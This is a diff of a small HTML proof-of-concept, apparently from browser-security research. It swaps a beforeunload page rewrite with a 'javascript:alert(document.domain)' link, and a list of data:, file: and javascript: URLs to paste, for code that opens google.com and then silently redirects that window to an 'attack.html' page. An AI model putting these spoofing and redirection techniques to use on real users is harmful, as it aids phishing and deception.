@@ -1,28 +1,8 @@
-<script>
+<body>
+  <script>
 function go() {
-document.title = 'Victim Site';
-document.body.innerHTML = 'Hello I am https://junomelon.com/ zz';
-document.body.innerHTML += `
-<br>
-<a href="javascript:alert(document.domain);">click me</a>
-`;
-}
-window.addEventListener('beforeunload', function (e) {
-go();
-return undefined;
-});
+  var x = window.open('https://www.google.com');
+  setTimeout(function(){x.location = "https://lbstyle.github.io/attack.html"}, 2000);
+};
 </script>
-
-<style>
-.juno {
-color: blue;
-}
-.juno2 {
-color: red;
-}
-</style>
-<h1>Copy & Paste to navigation bar:</h1>
-<h2><span class='juno'>https://lbstyle.github.io/y.php?x=data:1234</span></h2>
-<h2><span class='juno'>https://lbstyle.github.io/y.php?x=file:1234</span></h2>
-<h2><span class='juno'>https://lbstyle.github.io/y.php?x=customscheme:1234</span></h2>
-<h2><span class='juno2'>https://lbstyle.github.io/y.php?x=javascript:1234</span></h2>
+<input onclick="go()" value="Click here" type="button" /></body>
